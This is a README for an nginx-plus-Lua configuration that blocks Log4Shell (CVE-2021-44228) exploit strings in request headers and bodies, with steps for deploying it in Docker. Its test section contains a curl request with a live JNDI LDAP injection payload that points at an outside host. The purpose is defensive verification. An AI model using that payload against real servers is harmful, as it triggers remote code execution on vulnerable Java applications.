
# nginx-lua
This repository contains the configuration for the mitigation of Log4j vulnerabilities in the JAVA application. Nginx with the help of lua module will prevent the attacker to access vulnerable JAVA application


## Description
This implementation will provide a quick fix for the vulnerability [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228). Expertflow latest release is not vulnerable to this vulnerability and we recommend you to update to the latest release. However, this is also one way to mitigate the risk of remote code execution with the help of Nginx + lua module. After this implementation, each request will be inspected by Nginx and if the request has exploit to remotely execute the code in either its header or in the body, the request will be dropped and won't make its way to the internal Expertflow application. 


## Requirements
1. Expertflow has built Debian-based Nginx image with lua module build-in. Just pull the docker image of nginx from the Expertflow Dockerhub registry.
2. Update the `nginx.conf` file
3. Clone and mount the `nginx-lua.conf` `lua.conf`, and `cve_2021_44228.lua` files to your nginx container.




## Implementation Steps
1. Clone and copy the `nginx-lua.conf`, `lua.conf`, and `cve_2021_44228.lua` ,  in the `/path/to/release/docker/nginx/`
2. Update the `/path/to/release/docker/nginx/https-singleton.conf` file. Add the following code in `https-singleton.conf`
```
############## lua conf################
    set $captured_request_headers "";
    set $captured_request_body "";
    set $cve_2021_44228_log "";
    rewrite_by_lua_block {
        cve_2021_44228.block_cve_2021_44228()

 }
###########################################
````
3. Now we need to update the `/path/to/release/active/docker-compose-service-gateway.yml` file. 
- Update the `image:` entry with the `expertflow/nginx-lua:debian-1.21.4`
- Navigate to the `volume:` section and mount these files to docker container by adding the following code:
```
    volumes:
      - /path/to/release/docker/nginx/https-singleton.conf:/etc/nginx/conf.d/https.conf
      - /path/to/release/docker/nginx/nginx-lua.conf:/etc/nginx/nginx.conf
      - /path/to/release/docker/nginx/cve_2021_44228.lua:/usr/local/lib/lua/cve_2021_44228.lua
      - /path/to/release/docker/nginx/lua.conf:/etc/nginx/conf.d/lua.conf
```
4. Now just remove the nginx container and start it again. 

### Testing
We can now test our implementation whether it's blocking the exploit in the request or not. To test it, send the following request with the exploit present in the header and body with `curl`. Just replace the string `<FQDN>` with your FQDN.
```
curl --location --request POST 'https://<FQDN>/ccm/360notifications' \
--header 'efheader: ${jndi:ldap://8.8.4.4:1111/RCE/Command}' \
--header 'Content-Type: application/json' \
--data '{
    "messages": [{
        "from": "333",
        "contacts": "Jon Doe",
        "text": {
            "body": "${jndi:ldap://8.8.4.4:1111/RCE/Command}"
        }
    }]
}'
```
This will show you the following response which indicates that the configurations are working in perfect manner.
```
 Expertflow Log4J Forbidden
```
